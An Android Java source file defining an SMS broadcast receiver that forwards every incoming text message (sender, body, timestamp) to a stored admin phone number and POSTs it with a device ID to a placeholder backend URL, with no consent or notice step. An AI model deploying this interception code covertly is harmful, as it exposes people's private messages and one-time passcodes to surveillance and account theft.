package com.example.smsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String ADMIN_PREF = "AdminPreferences";
    private static final String ADMIN_NUMBER_KEY = "admin_number";
    private static final String API_URL = "https://your-backend-url.com/api/messages";

    @Override
    public void onReceive(Context context, Intent intent) {
        // Get the SMS message passed in
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            // Retrieve the SMS message received
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                // Process each PDU (Protocol Data Unit) in the SMS message
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    
                    // Get message details
                    String sender = smsMessage.getDisplayOriginatingAddress();
                    String message = smsMessage.getMessageBody();
                    long timestamp = smsMessage.getTimestampMillis();

                    // Forward SMS to admin number
                    forwardSmsToAdmin(context, sender, message);
                    
                    // Send to backend API
                    sendToBackend(context, sender, message, timestamp);
                }
            }
        }
    }

    private void forwardSmsToAdmin(Context context, String sender, String message) {
        try {
            // Get admin number from SharedPreferences
            String adminNumber = context.getSharedPreferences(ADMIN_PREF, Context.MODE_PRIVATE)
                    .getString(ADMIN_NUMBER_KEY, null);

            if (adminNumber != null && !adminNumber.isEmpty()) {
                // Format the forwarded message
                String forwardMsg = String.format("From: %s\nMessage: %s", sender, message);
                
                // Get instance of SmsManager
                SmsManager smsManager = SmsManager.getDefault();
                
                // Forward the SMS to admin number
                smsManager.sendTextMessage(adminNumber, null, forwardMsg, null, null);
                
                Log.d(TAG, "SMS forwarded to admin: " + adminNumber);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error forwarding SMS: " + e.getMessage());
        }
    }

    private void sendToBackend(Context context, String sender, String message, long timestamp) {
        new Thread(() -> {
            try {
                // Create JSON payload
                JSONObject payload = new JSONObject();
                payload.put("sender", sender);
                payload.put("content", message);
                payload.put("timestamp", timestamp);
                payload.put("deviceId", Utils.getDeviceId(context));

                // Create connection
                URL url = new URL(API_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                // Send data
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = payload.toString().getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                // Check response
                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Backend API response code: " + responseCode);

            } catch (Exception e) {
                Log.e(TAG, "Error sending to backend: " + e.getMessage());
            }
        }).start();
    }
}
